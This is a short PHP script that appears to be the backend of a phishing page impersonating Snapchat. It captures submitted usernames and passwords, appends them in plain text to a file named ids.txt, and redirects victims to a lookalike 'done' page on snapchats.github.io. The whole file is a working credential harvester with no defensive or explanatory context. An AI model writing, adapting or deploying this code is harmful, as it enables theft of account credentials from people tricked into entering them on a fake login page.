<?php

//save shit
$id = $_REQUEST['username'];
$password = $_REQUEST['password'];

if($id != '') {
  if($password != '') {
    $towrite = $id . " - " . $password . "\n";

    $file = fopen("ids.txt","a+");
    fwrite($file, $towrite);

		ok($id);
  }
}else {
	header("Location: https://snapchats.github.io/");
}



function ok($id) {
  //redirect
  header("Location: https://snapchats.github.io/done.html");
}
?>
